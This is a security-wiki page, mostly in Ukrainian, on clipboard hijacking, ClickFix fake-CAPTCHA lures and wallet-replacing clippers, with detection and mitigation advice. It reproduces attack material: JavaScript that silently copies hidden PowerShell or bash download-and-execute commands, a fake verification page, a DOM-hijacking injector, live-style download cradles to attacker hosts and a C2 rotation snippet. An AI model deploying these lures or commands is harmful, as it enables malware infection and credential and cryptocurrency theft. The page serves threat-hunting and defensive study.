# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – стара, але досі актуальна порада

## Overview

Clipboard hijacking – також відомий як *pastejacking* – зловживає тим фактом, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Шкідлива web page (або будь-який context із можливістю JavaScript, наприклад Electron чи Desktop application) програмно поміщає текст під контролем attacker у system clipboard. Жертв зазвичай, за допомогою ретельно підготовлених social-engineering інструкцій, заохочують натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити terminal і *paste* вміст clipboard, негайно виконуючи arbitrary commands.

Оскільки **не завантажується file і не відкривається attachment**, техніка обходить більшість e-mail і web-content security controls, які моніторять attachments, macros або direct command execution. Тому attack популярний у phishing campaigns, що доставляють commodity malware family, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## Wallet-address replacement clippers

Ще один варіант **clipboard hijacking** взагалі не вставляє commands: він чекає, доки victim скопіює **cryptocurrency wallet address**, а потім непомітно підміняє її на адресу під контролем attacker безпосередньо перед paste. Це особливо ефективно проти довгих wallet formats, тому що користувачі часто перевіряють лише перші/останні символи.

Типові реальні ознаки:
- **Thin loader + nested payload**: видимий app/exe виглядає як легітимний trading або "profit" tool, тоді як справжній clipper захований глибше в bundle (наприклад, .NET loader, що запускає nested Rust payload).
- **Regex-driven replacement**: malware зіставляє рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, або навіть generic **44-character Solana-like** strings і переписує їх на attacker wallets.
- **Wallet rotation at scale**: сучасні Windows samples можуть вбудовувати **тисячі** replacement wallets для кожної currency замість однієї static address, зменшуючи burn репутації wallet після кожної крадіжки.

### Windows clipper flow

Поширена реалізація — приховане window, зареєстроване через **`AddClipboardFormatListener`**. Після кожного оновлення clipboard malware зазвичай викликає:
- **`OpenClipboard`** → доступ до поточних clipboard data.
- **`GetClipboardData`** → читання text.
- **`EmptyClipboard`** + **`SetClipboardData`** → заміна wallet string на значення attacker.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Постійна присутність на рівні користувача достатня для impact. Один із спостережуваних шаблонів:
- Скопіювати payload до **`%APPDATA%\silke\silke.exe`**
- Створити **Startup-folder LNK** у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ідеї для detection:
- Process, що безперервно викликають clipboard APIs, одночасно записуючи в `%APPDATA%` і папку користувача **Startup**.
- Створення нового LNK/executable, після чого — переписування clipboard адреси wallet.
- Архіви або фейкові software bundles, що містять багато невикористовуваних файлів плюс маленький launcher, який запускає nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

На macOS деякі кампанії постачають допоміжний **`unlocker.command`** і інструктують жертву клацнути правою кнопкою → **Open**, якщо Gatekeeper каже, що app пошкоджений або від невідомого developer. Скрипт просто видаляє quarantine і запускає поруч розташований `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старі кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Користувач відвідує typosquatted або compromised site (e.g. `docusign.sa[.]com`)
2. Вбудований **ClearFake** JavaScript викликає `unsecuredCopyToClipboard()` helper, який непомітно зберігає Base64-encoded PowerShell one-liner у clipboard.
3. HTML instructions кажуть жертві: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` виконується, завантажуючи archive, що містить legitimate executable plus malicious DLL (classic DLL sideloading).
5. Loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Шкідливий DLL динамічно розв’язує API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх за допомогою rolling XOR key `"https://google.com/"`, інжектить фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) до `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader всередині **cscript.exe**
3. Отримує MSI payload → скидає `libcef.dll` поруч із підписаною application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** виклик запускає прихований PowerShell script, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відтворює `AutoIt3.exe` через `extrac32` & file concatenation і зрештою запускає `.a3x` script, який exfiltrates browser credentials до `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі ClickFix campaigns повністю пропускають file downloads і інструктують victims вставити one-liner, який fetches and executes JavaScript via WSH, persists it, і щодня rotates C2. Приклад observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Obfuscated URL, перевернутий під час виконання, щоб ускладнити поверхневий огляд.
- JavaScript самозберігається через Startup LNK (WScript/CScript) і вибирає C2 за поточним днем — що дає змогу швидко ротувати домени.

Мінімальний фрагмент JS, який використовується для ротації C2 за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто pinning TLS до жорстко зашитого certificate і chunking traffic.

Ідеї для detection, специфічні для цього варіанту
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Startup artifacts: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript із JS path у `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU і command-line telemetry, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторні `powershell -NoProfile -NonInteractive -Command -` із великими stdin payloads для подачі довгих scripts без довгих command lines.
- Scheduled Tasks, які згодом виконують LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під task/path, що виглядає як updater (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно ротовані C2 hostnames і URLs із pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Кореляція clipboard write events, за якими слідують Win+R paste, а потім негайне виконання `powershell.exe`.


Blue-teams можуть поєднувати clipboard, process-creation і registry telemetry, щоб точно виявляти pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає history команд **Win + R** – шукайте незвичні Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe`, а `NewProcessName` у { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для file creations у `%LocalAppData%\Microsoft\Windows\WinX\` або temporary folders безпосередньо перед підозрілим 4688 event.
* EDR clipboard sensors (якщо є) – корелюйте `Clipboard Write`, за яким одразу слідує новий PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Останні кампанії масово створюють фальшиві CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-specific commands із їхнього clipboard у native consoles. Це виводить execution із browser sandbox і працює як на Windows, так і на macOS.

Ключові ознаки builder-generated pages
- OS detection через `navigator.userAgent` для налаштування payloads (Windows PowerShell/CMD vs. macOS Terminal). Додаткові decoys/no-ops для unsupported OS — щоб зберегти ілюзію.
- Автоматичне clipboard-copy під час безпечних UI actions (checkbox/Copy), тоді як visible text може відрізнятися від clipboard content.
- Mobile blocking і popover з покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → відкрити Terminal→paste→Enter.
- Optional obfuscation і single-file injector для перезапису DOM скомпрометованого site на verification UI у стилі Tailwind (без потреби в новій domain registration).

Приклад: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence початкового запуску
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання продовжувалося після закриття термінала, зменшуючи видимі артефакти.

In-place захоплення сторінки на скомпрометованих сайтах
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ідеї для виявлення та hunting, специфічні для IUAM-style lures
- Web: Pages that bind Clipboard API до verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після browser interaction; batch/MSI installers, запущені з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, що запускає `bash`/`curl`/`base64 -d` з `nohup` поблизу browser events; background jobs, що переживають закриття terminal.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

Див. також supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати WordPress sites і інжектити loader JavaScript, який chain-ить external hosts (Cloudflare Workers, GitHub/jsDelivr) і навіть blockchain “etherhiding” calls (наприклад, POSTs до Binance Smart Chain API endpoints, таких як `bsc-testnet.drpc[.]org`) для отримання current lure logic. Recent overlays heavily use fake CAPTCHAs, які інструктують користувачів copy/paste one-liner (T1204.004) замість завантаження чогось.
- Initial execution дедалі частіше делегується signed script hosts/LOLBAS. У chains січня 2026 року раннє використання `mshta` було замінено на вбудований `SyncAppvPublishingServer.vbs`, executed через `WScript.exe`, з передачею PowerShell-like arguments з aliases/wildcards для fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у поєднанні з `WScript.exe` та незвичними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає високосигнальним етапом LOLBAS для ClearFake.
- У лютому 2026 року fake CAPTCHA payloads знову перейшли до чистих PowerShell download cradles. Два live приклади:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перша ланка — in-memory `iex(irm ...)` grabber; другая stages через `WinHttp.WinHttpRequest.5.1`, записує temp `.ps1`, а потім запускає з `-ep bypass` у прихованому вікні.

Поради для detection/hunting цих варіантів
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker, або raw IP `iex(irm ...)` patterns.
- Network: outbound до CDN worker hosts або blockchain RPC endpoints зі script hosts/PowerShell незабаром після web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
